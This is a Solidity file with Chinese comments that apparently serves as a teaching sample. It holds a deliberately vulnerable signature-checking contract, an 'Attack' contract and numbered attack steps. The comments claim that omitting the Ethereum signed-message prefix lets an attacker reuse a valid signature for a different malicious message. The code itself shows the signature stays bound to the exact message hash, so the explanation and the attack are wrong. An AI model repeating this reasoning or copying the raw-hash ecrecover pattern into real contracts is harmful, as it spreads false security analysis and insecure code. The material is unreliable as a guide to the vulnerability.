// Vulnerable Contract 示例：Incorrect Verification of Cryptographic Signature
// 此合約錯誤地驗證簽名，因為在 recover 時未使用 Ethereum Signed Message 前綴，
// 使得攻擊者可以製作惡意訊息以達成未經授權的資料更新。

pragma solidity >=0.8.0;

contract Vulnerable {
    // 狀態變數：記錄授權簽署者地址 (漏洞重點)
    address public authorizedSigner;
    
    // 狀態變數：儲存已處理訊息的雜湊 (漏洞重點)
    bytes32 public lastProcessedHash;

    constructor(address _authorizedSigner) {
        authorizedSigner = _authorizedSigner;
    }

    // 漏洞函式：處理訊息並驗證簽名，但錯誤地驗證簽名的正確性
    // 攻擊者可利用此漏洞，提交惡意訊息以及合法簽名（由授權者對原本訊息簽名）來更新狀態
    function processMessage(string memory message, bytes memory signature) public {
        // 計算訊息的 hash (漏洞重點：未加入前綴)
        bytes32 messageHash = keccak256(abi.encodePacked(message));
        
        // 從簽名中還原出 signer 地址
        address signer = recoverSigner(messageHash, signature);
        
        // 驗證 recovered address 是否為授權簽署者
        require(signer == authorizedSigner, "Not authorized");
        
        // 更新已處理訊息的 hash (漏洞可能使攻擊者更新狀態)
        lastProcessedHash = keccak256(abi.encodePacked(lastProcessedHash, messageHash));
    }

    // 輔助函式：從給定的 hash 和簽名中還原出 signer (漏洞在此，未加入前綴處理)
    function recoverSigner(bytes32 _hash, bytes memory _signature) public pure returns (address) {
        require(_signature.length == 65, "invalid signature length");

        bytes32 r;
        bytes32 s;
        uint8 v;
        // 使用 assembly 從簽名資料中讀取 r, s, v
        assembly {
            r := mload(add(_signature, 32))
            s := mload(add(_signature, 64))
            v := byte(0, mload(add(_signature, 96)))
        }
        // 漏洞：未使用標準的以太坊簽名前綴，因此驗證可能被繞過
        return ecrecover(_hash, v, r, s);
    }
}

// 攻擊示例合約：Attack
// 此攻擊合約展示如何利用 Vulnerable 合約中的簽名驗證漏洞
contract Attack {
    Vulnerable public vulnerableContract;

    // 在部署時指定 Vulnerable 合約地址
    constructor(address _vulnerableAddress) {
        vulnerableContract = Vulnerable(_vulnerableAddress);
    }

    // 攻擊流程：
    // 1. 攻擊者取得某合法用戶授權後簽名 (但由於未使用前綴，攻擊者可以對不同訊息重放該簽名)
    // 2. 攻擊者呼叫此函式，以惡意訊息與合法簽名更新狀態
    function attack(string memory maliciousMessage, bytes memory signature) public {
        // 呼叫 vulnerableContract.processMessage，利用漏洞更新狀態
        vulnerableContract.processMessage(maliciousMessage, signature);
    }
}

/*
部署與攻擊步驟說明：
1. 部署 Vulnerable 合約，指定一個授權簽署者地址 (例如由受信任伺服器持有私鑰)。
2. 授權簽署者對預期訊息作出簽名，但由於合約錯誤沒有添加前綴，攻擊者能夠
   利該簽名對一個不同且惡意的訊息進行重放。
3. 部署 Attack 合約，傳入 Vulnerable 合約的位址。
4. 攻擊者呼叫 Attack 合約的 attack() 函式，提交惡意訊息及合法簽名，成功更新狀態。
*/